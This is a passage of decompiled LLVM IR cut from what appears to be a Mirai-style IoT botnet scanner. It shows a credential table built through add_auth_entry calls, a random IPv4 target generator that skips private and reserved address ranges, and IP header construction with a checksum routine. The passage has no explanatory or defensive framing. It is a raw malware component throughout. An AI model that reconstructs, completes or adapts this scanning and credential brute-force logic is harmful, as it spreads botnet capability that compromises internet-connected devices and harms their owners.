  store i32 ptrtoint (i32* @global_var_19aac.186 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_ef4c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint (i32* @global_var_19aac.186 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_19abc.188 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ef5c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint ([6 x i8]* @global_var_19abc.188 to i32), i32 9)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19ac4.190 to i32), i32* %r1.global-to-local, align 4
  %v5_ef6c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ac4.190 to i32), i32 ptrtoint ([5 x i8]* @global_var_19ac4.190 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_19acc.192 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ef7c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32 ptrtoint (i32* @global_var_19acc.192 to i32), i32 15)
  store i32 ptrtoint (i32* @global_var_19ad8.194 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ef8c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32 ptrtoint (i32* @global_var_19ad8.194 to i32), i32 15)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19ae4.196 to i32), i32* %r1.global-to-local, align 4
  %v5_ef9c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ae4.196 to i32), i32 ptrtoint ([5 x i8]* @global_var_19ae4.196 to i32), i32 9)
  store i32 ptrtoint (i32* @global_var_19aec.198 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_efac = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32 ptrtoint (i32* @global_var_19aec.198 to i32), i32 14)
  %v2_efb4 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_efb4, i32* @lr, align 4
  %v1_f2dc = add i32 %v2_efb4, 20
  %v1_f33c = add i32 %v2_efb4, 16
  %v2_f33c = inttoptr i32 %v1_f33c to i32*
  %v1_f3e0 = add i32 %v2_efb4, 12
  %v2_f3e0 = inttoptr i32 %v1_f3e0 to i32*
  %v2_f5d0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_f618 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f61c = ptrtoint i32* %stack_var_-224 to i32
  %v2_f620 = ptrtoint i32* %stack_var_-352 to i32
  %v2_100a0 = ptrtoint i32* %stack_var_-45 to i32
  %v2_100b4 = ptrtoint i32* %stack_var_-77 to i32
  %v2_1000c = ptrtoint i32* %stack_var_-60 to i32
  %v2_f86c = ptrtoint i32* %stack_var_-104 to i32
  %v2_10344 = ptrtoint i32* %stack_var_-96 to i32
  %v2_1039c = ptrtoint i32* %stack_var_-42 to i32
  %v1_f34c = add i32 %v2_efb4, 9
  %v2_f34c = inttoptr i32 %v1_f34c to i8*
  br label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_f7c0, %dec_label_pc_ee44
  %stack_var_-1880.0 = phi i32 [ %tmp334, %dec_label_pc_ee44 ], [ %stack_var_-1880.1, %dec_label_pc_f7c0 ]
  store i32 ptrtoint (i32* @global_var_22448.145 to i32), i32* %r1.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r2.global-to-local, align 4
  %v2_efc4 = load i32, i32* @global_var_22448.145, align 4
  store i32 %v2_efc4, i32* @r4, align 4
  %v3_efc8 = icmp uge i32 %stack_var_-1880.0, %v2_efc4
  store i1 %v3_efc8, i1* %cpsr_c.global-to-local, align 1
  %v9_efc8 = icmp eq i32 %stack_var_-1880.0, %v2_efc4
  store i1 %v9_efc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efc8, label %dec_label_pc_f2d0, label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %dec_label_pc_efbc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_10344, i32* @r5, align 4
  br label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %bb405, %dec_label_pc_efd0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_eff4 = call i32 @rand_next()
  %v1_eff4 = trunc i32 %v0_eff4 to i16
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %ip.global-to-local, align 4
  %v2_f000 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_f000, i32* %r3.global-to-local, align 4
  store i16 %v1_eff4, i16* bitcast (i32* @global_var_2241c.165 to i16*), align 4
  store i32 %v2_f000, i32* @global_var_22424.199, align 4
  br label %dec_label_pc_f00c

dec_label_pc_f00c:                                ; preds = %dec_label_pc_f164, %dec_label_pc_f03c, %dec_label_pc_f198, %dec_label_pc_f18c, %dec_label_pc_f180, %dec_label_pc_f174, %.thread47, %.thread31, %.thread27, %.thread23, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_f0d8, %dec_label_pc_f0d0, %bb383, %dec_label_pc_f0a0, %dec_label_pc_f07c, %bb376, %dec_label_pc_f04c, %bb375, %dec_label_pc_f034, %bb374, %bb400, %dec_label_pc_efe0
  %v0_f00c = call i32 @rand_next()
  %v1_f010 = urem i32 %v0_f00c, 256
  store i32 %v1_f010, i32* %r1.global-to-local, align 4
  %v3_f014 = udiv i32 %v0_f00c, 256
  store i32 %v3_f014, i32* %r3.global-to-local, align 4
  %v3_f018 = udiv i32 %v0_f00c, 65536
  store i32 %v3_f018, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f01c = icmp eq i32 %v1_f010, 0
  store i1 %v2_f01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f01c, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_f00c
  %v3_f020 = icmp ugt i32 %v1_f010, 126
  store i1 %v3_f020, i1* %cpsr_c.global-to-local, align 1
  %v8_f020 = icmp eq i32 %v1_f010, 127
  store i1 %v8_f020, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_f00c, %bb373
  %v0_f030 = phi i1 [ true, %dec_label_pc_f00c ], [ %v8_f020, %bb373 ]
  %v1_f024 = urem i32 %v3_f014, 256
  store i32 %v1_f024, i32* %ip.global-to-local, align 4
  %v1_f028 = urem i32 %v3_f018, 256
  store i32 %v1_f028, i32* %r2.global-to-local, align 4
  %v1_f02c = and i32 %v0_f00c, 8388608
  %v2_f02c = icmp ne i32 %v1_f02c, 0
  store i1 %v2_f02c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f030, label %dec_label_pc_f00c, label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %bb374
  %v2_f034 = icmp ugt i32 %v1_f010, 2
  store i1 %v2_f034, i1* %cpsr_c.global-to-local, align 1
  %v7_f034 = icmp eq i32 %v1_f010, 3
  store i1 %v7_f034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f034, label %dec_label_pc_f00c, label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f034
  %v1_f03c = add nsw i32 %v1_f010, -15
  store i32 %v1_f03c, i32* %r3.global-to-local, align 4
  %v2_f040 = icmp ugt i32 %v1_f010, 55
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i32 %v1_f010, 56
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f040, label %dec_label_pc_f00c, label %bb375

bb375:                                            ; preds = %dec_label_pc_f03c
  %v3_f044 = icmp ne i32 %v1_f03c, 0
  store i1 %v3_f044, i1* %cpsr_c.global-to-local, align 1
  %v8_f044 = icmp eq i32 %v1_f03c, 1
  store i1 %v8_f044, i1* %cpsr_z.global-to-local, align 1
  %v2_f048 = xor i1 %v3_f044, true
  %v3_f048 = or i1 %v8_f044, %v2_f048
  br i1 %v3_f048, label %dec_label_pc_f00c, label %dec_label_pc_f04c

dec_label_pc_f04c:                                ; preds = %bb375
  %v2_f04c = icmp ugt i32 %v1_f010, 9
  store i1 %v2_f04c, i1* %cpsr_c.global-to-local, align 1
  %v7_f04c = icmp eq i32 %v1_f010, 10
  store i1 %v7_f04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f04c, label %dec_label_pc_f00c, label %dec_label_pc_f054

dec_label_pc_f054:                                ; preds = %dec_label_pc_f04c
  %v2_f054 = icmp ugt i32 %v1_f010, 191
  store i1 %v2_f054, i1* %cpsr_c.global-to-local, align 1
  %v7_f054 = icmp eq i32 %v1_f010, 192
  store i1 %v7_f054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f054, label %bb376, label %dec_label_pc_f060

bb376:                                            ; preds = %dec_label_pc_f054
  %v3_f058 = icmp ugt i32 %v1_f024, 167
  store i1 %v3_f058, i1* %cpsr_c.global-to-local, align 1
  %v8_f058 = icmp eq i32 %v1_f024, 168
  store i1 %v8_f058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f058, label %dec_label_pc_f00c, label %dec_label_pc_f060

dec_label_pc_f060:                                ; preds = %dec_label_pc_f054, %bb376
  %v7_f060 = icmp eq i32 %v1_f010, 172
  %.458 = zext i1 %v7_f060 to i32
  store i32 %.458, i32* %r3.global-to-local, align 4
  %v2_f06c = icmp ugt i32 %v1_f024, 14
  store i1 %v2_f06c, i1* %cpsr_c.global-to-local, align 1
  %v7_f06c = icmp eq i32 %v1_f024, 15
  store i1 %v7_f06c, i1* %cpsr_z.global-to-local, align 1
  %v2_f070 = xor i1 %v2_f06c, true
  %v3_f070 = or i1 %v7_f06c, %v2_f070
  br i1 %v3_f070, label %.thread7, label %bb379

.thread7:                                         ; preds = %dec_label_pc_f060
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f084

bb379:                                            ; preds = %dec_label_pc_f060
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f074 = icmp eq i1 %v7_f060, false
  store i1 %v2_f074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f074, label %dec_label_pc_f084, label %dec_label_pc_f07c

dec_label_pc_f07c:                                ; preds = %bb379
  %v2_f07c = icmp ugt i32 %v1_f024, 30
  store i1 %v2_f07c, i1* %cpsr_c.global-to-local, align 1
  %v7_f07c = icmp eq i32 %v1_f024, 31
  store i1 %v7_f07c, i1* %cpsr_z.global-to-local, align 1
  %v2_f080 = xor i1 %v2_f07c, true
  %v3_f080 = or i1 %v7_f07c, %v2_f080
  br i1 %v3_f080, label %dec_label_pc_f00c, label %dec_label_pc_f084

dec_label_pc_f084:                                ; preds = %.thread7, %dec_label_pc_f07c, %bb379
  %v7_f084 = icmp eq i32 %v1_f010, 100
  %.459 = zext i1 %v7_f084 to i32
  store i32 %.459, i32* %r3.global-to-local, align 4
  %v2_f090 = icmp ugt i32 %v1_f024, 62
  store i1 %v2_f090, i1* %cpsr_c.global-to-local, align 1
  %v7_f090 = icmp eq i32 %v1_f024, 63
  store i1 %v7_f090, i1* %cpsr_z.global-to-local, align 1
  %v2_f094 = xor i1 %v2_f090, true
  %v3_f094 = or i1 %v7_f090, %v2_f094
  br i1 %v3_f094, label %.thread12, label %bb382

.thread12:                                        ; preds = %dec_label_pc_f084
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0a8

bb382:                                            ; preds = %dec_label_pc_f084
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f098 = icmp eq i1 %v7_f084, false
  store i1 %v2_f098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f098, label %dec_label_pc_f0a8, label %dec_label_pc_f0a0

dec_label_pc_f0a0:                                ; preds = %bb382
  %v2_f0a0 = icmp ugt i32 %v1_f024, 125
  store i1 %v2_f0a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a0 = icmp eq i32 %v1_f024, 126
  store i1 %v7_f0a0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0a4 = xor i1 %v2_f0a0, true
  %v3_f0a4 = or i1 %v7_f0a0, %v2_f0a4
  br i1 %v3_f0a4, label %dec_label_pc_f00c, label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %.thread12, %dec_label_pc_f0a0, %bb382
  %v2_f0a8 = icmp ugt i32 %v1_f010, 168
  store i1 %v2_f0a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a8 = icmp eq i32 %v1_f010, 169
  store i1 %v7_f0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0a8, label %bb383, label %dec_label_pc_f0b4

bb383:                                            ; preds = %dec_label_pc_f0a8
  %v3_f0ac = icmp eq i32 %v1_f024, 255
  store i1 %v3_f0ac, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f0ac, label %dec_label_pc_f00c, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f0a8, %bb383
  %v7_f0b4 = icmp eq i32 %v1_f010, 198
  %.460 = zext i1 %v7_f0b4 to i32
  store i32 %.460, i32* %r3.global-to-local, align 4
  %v2_f0c0 = icmp ugt i32 %v1_f024, 16
  store i1 %v2_f0c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c0 = icmp eq i32 %v1_f024, 17
  store i1 %v7_f0c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0c4 = xor i1 %v2_f0c0, true
  %v3_f0c4 = or i1 %v7_f0c0, %v2_f0c4
  br i1 %v3_f0c4, label %.thread18, label %bb386

.thread18:                                        ; preds = %dec_label_pc_f0b4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0d8

bb386:                                            ; preds = %dec_label_pc_f0b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0c8 = icmp eq i1 %v7_f0b4, false
  store i1 %v2_f0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0c8, label %dec_label_pc_f0d8, label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %bb386
  %v2_f0d0 = icmp ugt i32 %v1_f024, 18
  store i1 %v2_f0d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0d0 = icmp eq i32 %v1_f024, 19
  store i1 %v7_f0d0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d4 = xor i1 %v2_f0d0, true
  %v3_f0d4 = or i1 %v7_f0d0, %v2_f0d4
  br i1 %v3_f0d4, label %dec_label_pc_f00c, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %.thread18, %dec_label_pc_f0d0, %bb386
  %v2_f0d8 = icmp ugt i32 %v1_f010, 222
  store i1 %v2_f0d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0d8 = icmp eq i32 %v1_f010, 223
  store i1 %v7_f0d8, i1* %cpsr_z.global-to-local, align 1
  %v2_f0dc = xor i1 %v7_f0d8, true
  %v3_f0dc = and i1 %v2_f0d8, %v2_f0dc
  br i1 %v3_f0dc, label %dec_label_pc_f00c, label %dec_label_pc_f0e0

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0d8
  %v7_f0e0 = icmp eq i32 %v1_f010, 106
  %.461 = zext i1 %v7_f0e0 to i32
  %v2_f0ec = icmp ugt i32 %v1_f024, 185
  store i1 %v2_f0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ec = icmp eq i32 %v1_f024, 186
  store i1 %v7_f0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0ec, label %bb389, label %dec_label_pc_f0f8

bb389:                                            ; preds = %dec_label_pc_f0e0
  %v2_f0e0 = icmp ugt i32 %v1_f010, 105
  store i1 %v2_f0e0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0e0, label %dec_label_pc_f00c, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0e0, %bb389
  %v2_f0f8 = icmp ugt i32 %v1_f024, 186
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i32 %v1_f024, 187
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0f8, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_f0f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f10c

.thread23:                                        ; preds = %dec_label_pc_f0f8
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f104 = icmp eq i1 %v7_f0e0, false
  store i1 %v2_f104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f104, label %dec_label_pc_f10c, label %dec_label_pc_f00c

dec_label_pc_f10c:                                ; preds = %.thread24, %.thread23
  %v2_f10c = icmp ugt i32 %v1_f024, 184
  store i1 %v2_f10c, i1* %cpsr_c.global-to-local, align 1
  %v7_f10c = icmp eq i32 %v1_f024, 185
  store i1 %v7_f10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f10c, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f10c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f120

.thread27:                                        ; preds = %dec_label_pc_f10c
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f118 = icmp eq i1 %v7_f0e0, false
  store i1 %v2_f118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f118, label %dec_label_pc_f120, label %dec_label_pc_f00c

dec_label_pc_f120:                                ; preds = %.thread28, %.thread27
  %v2_f120 = icmp ugt i32 %v1_f024, 183
  store i1 %v2_f120, i1* %cpsr_c.global-to-local, align 1
  %v7_f120 = icmp eq i32 %v1_f024, 184
  store i1 %v7_f120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f120, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_f120
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f134

.thread31:                                        ; preds = %dec_label_pc_f120
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f12c = icmp eq i1 %v7_f0e0, false
  store i1 %v2_f12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f12c, label %dec_label_pc_f134, label %dec_label_pc_f00c

dec_label_pc_f134:                                ; preds = %.thread32, %.thread31
  %v2_f134 = icmp ugt i32 %v1_f010, 149
  store i1 %v2_f134, i1* %cpsr_c.global-to-local, align 1
  %v7_f134 = icmp eq i32 %v1_f010, 150
  store i1 %v7_f134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f134, label %bb390, label %dec_label_pc_f140

bb390:                                            ; preds = %dec_label_pc_f134
  %v3_f138 = icmp ugt i32 %v1_f024, 30
  store i1 %v3_f138, i1* %cpsr_c.global-to-local, align 1
  %v8_f138 = icmp eq i32 %v1_f024, 31
  store i1 %v8_f138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f138, label %dec_label_pc_f00c, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f134, %bb390
  %v2_f140 = icmp ugt i32 %v1_f010, 48
  store i1 %v2_f140, i1* %cpsr_c.global-to-local, align 1
  %v7_f140 = icmp eq i32 %v1_f010, 49
  store i1 %v7_f140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f140, label %bb391, label %dec_label_pc_f14c

bb391:                                            ; preds = %dec_label_pc_f140
  %v3_f144 = icmp ugt i32 %v1_f024, 50
  store i1 %v3_f144, i1* %cpsr_c.global-to-local, align 1
  %v8_f144 = icmp eq i32 %v1_f024, 51
  store i1 %v8_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f144, label %dec_label_pc_f00c, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f140, %bb391
  %v2_f14c = icmp ugt i32 %v1_f010, 177
  store i1 %v2_f14c, i1* %cpsr_c.global-to-local, align 1
  %v7_f14c = icmp eq i32 %v1_f010, 178
  store i1 %v7_f14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f14c, label %bb392, label %dec_label_pc_f158

bb392:                                            ; preds = %dec_label_pc_f14c
  %v3_f150 = icmp ugt i32 %v1_f024, 61
  store i1 %v3_f150, i1* %cpsr_c.global-to-local, align 1
  %v8_f150 = icmp eq i32 %v1_f024, 62
  store i1 %v8_f150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f150, label %dec_label_pc_f00c, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f14c, %bb392
  %v2_f158 = icmp ugt i32 %v1_f010, 159
  store i1 %v2_f158, i1* %cpsr_c.global-to-local, align 1
  %v7_f158 = icmp eq i32 %v1_f010, 160
  store i1 %v7_f158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f158, label %bb393, label %dec_label_pc_f164

bb393:                                            ; preds = %dec_label_pc_f158
  %v3_f15c = icmp ugt i32 %v1_f024, 12
  store i1 %v3_f15c, i1* %cpsr_c.global-to-local, align 1
  %v8_f15c = icmp eq i32 %v1_f024, 13
  store i1 %v8_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f15c, label %dec_label_pc_f00c, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f158, %bb393
  %v1_f164 = add nsw i32 %v1_f010, -6
  store i32 %v1_f164, i32* %r3.global-to-local, align 4
  %v2_f168 = icmp ugt i32 %v1_f010, 10
  store i1 %v2_f168, i1* %cpsr_c.global-to-local, align 1
  %v7_f168 = icmp eq i32 %v1_f010, 11
  store i1 %v7_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f168, label %dec_label_pc_f00c, label %bb394

bb394:                                            ; preds = %dec_label_pc_f164
  %v3_f16c = icmp ne i32 %v1_f164, 0
  store i1 %v3_f16c, i1* %cpsr_c.global-to-local, align 1
  %v8_f16c = icmp eq i32 %v1_f164, 1
  store i1 %v8_f16c, i1* %cpsr_z.global-to-local, align 1
  %v2_f170 = xor i1 %v3_f16c, true
  %v3_f170 = or i1 %v8_f16c, %v2_f170
  br i1 %v3_f170, label %dec_label_pc_f00c, label %dec_label_pc_f174

dec_label_pc_f174:                                ; preds = %bb394
  %v2_f174 = icmp ugt i32 %v1_f010, 21
  store i1 %v2_f174, i1* %cpsr_c.global-to-local, align 1
  %v7_f174 = icmp eq i32 %v1_f010, 22
  store i1 %v7_f174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f174, label %dec_label_pc_f00c, label %bb395

bb395:                                            ; preds = %dec_label_pc_f174
  %v3_f178 = icmp ugt i32 %v1_f010, 20
  store i1 %v3_f178, i1* %cpsr_c.global-to-local, align 1
  %v8_f178 = icmp eq i32 %v1_f010, 21
  store i1 %v8_f178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f178, label %dec_label_pc_f00c, label %dec_label_pc_f180

dec_label_pc_f180:                                ; preds = %bb395
  %v2_f180 = icmp ugt i32 %v1_f010, 27
  store i1 %v2_f180, i1* %cpsr_c.global-to-local, align 1
  %v7_f180 = icmp eq i32 %v1_f010, 28
  store i1 %v7_f180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f180, label %dec_label_pc_f00c, label %bb396

bb396:                                            ; preds = %dec_label_pc_f180
  %v3_f184 = icmp ugt i32 %v1_f010, 25
  store i1 %v3_f184, i1* %cpsr_c.global-to-local, align 1
  %v8_f184 = icmp eq i32 %v1_f010, 26
  store i1 %v8_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f184, label %dec_label_pc_f00c, label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %bb396
  %v2_f18c = icmp ugt i32 %v1_f010, 29
  store i1 %v2_f18c, i1* %cpsr_c.global-to-local, align 1
  %v7_f18c = icmp eq i32 %v1_f010, 30
  store i1 %v7_f18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f18c, label %dec_label_pc_f00c, label %bb397

bb397:                                            ; preds = %dec_label_pc_f18c
  %v3_f190 = icmp ugt i32 %v1_f010, 28
  store i1 %v3_f190, i1* %cpsr_c.global-to-local, align 1
  %v8_f190 = icmp eq i32 %v1_f010, 29
  store i1 %v8_f190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f190, label %dec_label_pc_f00c, label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %bb397
  %v2_f198 = icmp ugt i32 %v1_f010, 54
  store i1 %v2_f198, i1* %cpsr_c.global-to-local, align 1
  %v7_f198 = icmp eq i32 %v1_f010, 55
  store i1 %v7_f198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f198, label %dec_label_pc_f00c, label %bb398

bb398:                                            ; preds = %dec_label_pc_f198
  %v3_f19c = icmp ugt i32 %v1_f010, 32
  store i1 %v3_f19c, i1* %cpsr_c.global-to-local, align 1
  %v8_f19c = icmp eq i32 %v1_f010, 33
  store i1 %v8_f19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f19c, label %dec_label_pc_f00c, label %dec_label_pc_f1a4

dec_label_pc_f1a4:                                ; preds = %bb398
  %v2_f1a4 = icmp ugt i32 %v1_f010, 214
  store i1 %v2_f1a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a4 = icmp eq i32 %v1_f010, 215
  store i1 %v7_f1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1a4, label %.thread47, label %bb399

bb399:                                            ; preds = %dec_label_pc_f1a4
  %v3_f1a8 = icmp ugt i32 %v1_f010, 213
  store i1 %v3_f1a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1a8 = icmp eq i32 %v1_f010, 214
  store i1 %v8_f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1a8, label %bb400, label %dec_label_pc_f1b8

.thread47:                                        ; preds = %dec_label_pc_f1a4
  br label %dec_label_pc_f00c

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_f00c

dec_label_pc_f1b8:                                ; preds = %bb399
  %v5_f1c4 = call i32 @llvm.bswap.i32(i32 %v0_f00c)
  store i32 %v5_f1c4, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_f00c, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_f1cc = udiv i32 %v5_f1c4, 16777216
  %v1_f1d0 = and i32 %v5_f1c4, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v4_f1d4 = udiv i32 %tmp402, 256
  %v4_f1d8 = mul i32 %v1_f1d0, 256
  store i32 ptrtoint (i8** @global_var_22418.160 to i32), i32* @r0, align 4
  %tmp403 = and i32 %v0_f00c, 65536
  %v3_f1e0 = icmp ne i32 %tmp403, 0
  store i1 %v3_f1e0, i1* %cpsr_c.global-to-local, align 1
  %v4_f1e0 = mul i32 %v5_f1c4, 16777216
  %v5_f1d4 = or i32 %v4_f1e0, %v3_f1cc
  %v5_f1d8 = or i32 %v5_f1d4, %v4_f1d4
  %v5_f1e0 = or i32 %v5_f1d8, %v4_f1d8
  store i32 %v5_f1e0, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_22422.200 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_f1e0, i32* @global_var_22428.201, align 4
  %v3_f1f0 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_22418.160 to i32), i32 20)
  %v4_f1f0 = trunc i32 %v3_f1f0 to i16
  %v3_f1f4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f1f4, i32* %r1.global-to-local, align 4
  %v5_f204 = sdiv i32 %v3_f1f4, 10
  %v3_f208 = mul i32 %v5_f204, 8
  store i32 %v3_f208, i32* %r2.global-to-local, align 4
  %v2_f210 = mul i32 %v5_f204, 10
  store i32 %v2_f210, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22418.160 to i32), i32* %ip.global-to-local, align 4
  %v3_f218 = icmp uge i32 %v3_f1f4, %v2_f210
  store i1 %v3_f218, i1* %cpsr_c.global-to-local, align 1
  %v9_f218 = icmp eq i32 %v3_f1f4, %v2_f210
  store i1 %v9_f218, i1* %cpsr_z.global-to-local, align 1
